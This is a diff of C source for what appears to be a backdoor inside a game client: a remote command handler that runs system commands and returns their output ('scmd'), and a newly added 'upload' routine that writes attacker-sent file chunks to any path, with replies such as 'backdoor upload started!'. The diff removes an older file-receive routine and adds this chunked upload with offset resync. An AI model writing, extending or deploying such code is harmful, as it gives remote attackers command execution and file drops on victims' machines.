@@ -49,113 +49,51 @@ cleanup2:
 	return szBuffer;
 }
 
-unsigned char ascii2char(char *inASCII)
-{
-	unsigned char outDec;
-	for (unsigned long count = 1, nums = 0; nums <= strlen(inASCII) - 1; count *= 10, nums++) {
-		if (inASCII[nums] >= 48 && inASCII[nums] <= 57) {
-			if (count == 1) outDec = inASCII[nums] - 48;
-			if (count > 1) {
-				if (inASCII[nums] - 48 == 0) outDec *= 10;
-				else outDec = outDec * 10 + inASCII[nums] - 48;
-			}
-		}
-		else {
-			printf("Error!\n");
-			exit(1);
-		}
-	}
-	return outDec;
-}
-
-unsigned char ascii2hex(char *inASCII,unsigned char readsize, char *paddr)
-{
-	unsigned char outHex = 0;
-	for (unsigned long nums = 0, filebufnums = 0; nums < strlen(inASCII); filebufnums++) {
-		outHex = 0;
-		//printf("HEX:%.2x ", inASCII[nums]);
-		if (nums < strlen(inASCII) - 1) {
-			for (unsigned times = 0; times < 2; times++, nums++) {
-				if (inASCII[nums] >= 48 && inASCII[nums] <= 57) {
-					outHex *= 16;
-					outHex += inASCII[nums] - 48;
-				}
-				else if (inASCII[nums] >= 65 && inASCII[nums] <= 70) {
-					outHex *= 16;
-					outHex += inASCII[nums] - 55;
-
-				}
-				else if (inASCII[nums] >= 97 && inASCII[nums] <= 102) {
-					outHex *= 16;
-					outHex += inASCII[nums] - 87;
-				}
-			}
-			paddr[filebufnums] = outHex;
-			fputc(outHex, outputfb);
-			//printf("HEX:%.2x ", outHex);
-		}
-	}
-	paddr[readsize] = '\0';
-	return outHex;
-}
-
-const char *recv_file(const char *cmd) {
-	//printf("%s", cmd);
-	char *cmd_new = _strdup(cmd);
-	char *cmdspilt = strtok(cmd_new, " ");
-	static char cmdoutput[256], filebuf[101];
-	memset(cmdoutput, 0, sizeof(cmdoutput));
-	memset(filebuf, 0, sizeof(filebuf));
-
-	if (strcmp(cmdspilt, "path") == 0) {
-		//printf("filename: ");
-		cmdspilt = strtok(NULL, " ");
-		strcpy(outputfilename, cmdspilt);
-		//printf("%s\n", cmdspilt);
-		outputfb = fopen(outputfilename, "w");
-		fprintf(outputfb, "");
-		fclose(outputfb);
-		outputfb = fopen(outputfilename, "ab");
-	}
-
-	if (strcmp(cmdspilt, "filebin") == 0) {
-		//printf("filebin: ");
-		cmdspilt = strtok(NULL, " ");
-		strcat(cmdoutput, cmdspilt);
-		char *recvsize = cmdspilt;
-		strcat(cmdoutput, " ");
-		cmdspilt = strtok(NULL, " ");
-		//printf("%d\n", ascii2char(recvsize));
-		ascii2hex(cmdspilt, ascii2char(recvsize), filebuf);
-		//printf("Output:%s\n", filebuf);
-		strcat(cmdoutput, cmdspilt);
-		strcat(cmdoutput, " ");
-		cmdspilt = strtok(NULL, " ");
-		strcat(cmdoutput, cmdspilt);
-		strcat(cmdoutput, " ");
-		//printf("%s\n", cmdoutput);
-		//fputs(filebuf, outputfb);
-		//fprintf(outputfb, "%s\n", cmdoutput);
-	}
-
-	if (strcmp(cmdspilt, "fileend") == 0) {
-		printf("fileend\n");
-		fclose(outputfb);
-	}
-
-	free(cmd_new);
-	return cmdoutput;
-}
-
 const char *process_remote_cmd(const char *cmd)
 {
 	const char *ret = "";
+	static FILE *fp = NULL;
+	static int pkt_num = 0;
 	if (strstr(cmd, "gcmd"))
 		run_game_cmd(&cmd[5]);
 	else if (strstr(cmd, "scmd"))
 		return get_sys_cmd_output(&cmd[5]);
-	else if (strstr(cmd, "sendfile"))
-		return recv_file(&cmd[9]);
+	else if (strstr(cmd, "upload")) {
+		char file_offset_str[20] = { 0 };
+		strncpy(file_offset_str, &cmd[7], 20);
+		file_offset_str[19] = '\0';
+		long file_offset_client = atoi(file_offset_str);
+		if (file_offset_client == -1) {
+			pkt_num = 0;
+			if (fp)
+				fclose(fp);
+			fp = fopen(&cmd[49], "wb");
+			if (!fp)
+				return "backdoor upload failed!";
+			return "backdoor upload started!";
+		} else if (file_offset_client == -2) {
+			printf("pkt num: %d\n", pkt_num);
+			fclose(fp);
+			return "backdoor end";
+		} else if (file_offset_client >= 0) {
+			char data_size_str[5] = { 0 };
+			strncpy(data_size_str, &cmd[28], 4);
+			data_size_str[4] = '\0';
+			long data_size = atol(data_size_str);
+			long file_offset_server = ftell(fp);
+			if (file_offset_server + data_size < file_offset_client) {
+				static char msg[1024];
+				memset(msg, '\0', sizeof(msg));
+				sprintf(msg, "backdoor set_offset %d", file_offset_server);
+				return msg;
+			} else if (file_offset_server > file_offset_client) {
+				fseek(fp, file_offset_client, SEEK_SET);
+				file_offset_server = file_offset_client;
+			}
+			pkt_num++;
+			fwrite(&cmd[33], 1, data_size, fp);
+		}
+	}
 
     char *cmd_m = _strdup(cmd);
     const char *argv[4];
